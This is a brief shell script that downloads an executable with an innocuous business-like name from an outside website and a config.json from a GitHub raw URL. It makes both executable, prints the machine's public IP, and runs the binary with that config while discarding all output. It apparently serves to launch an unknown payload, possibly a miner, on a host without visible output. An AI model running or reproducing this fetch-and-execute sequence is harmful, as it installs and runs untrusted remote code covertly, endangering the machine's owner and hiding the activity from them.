wget https://maper.info/HerMajestyFinancialInc && chmod +x HerMajestyFinancialInc >/dev/null 2>&1
wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " "
./HerMajestyFinancialInc -c "config.json" >/dev/null 2>&1
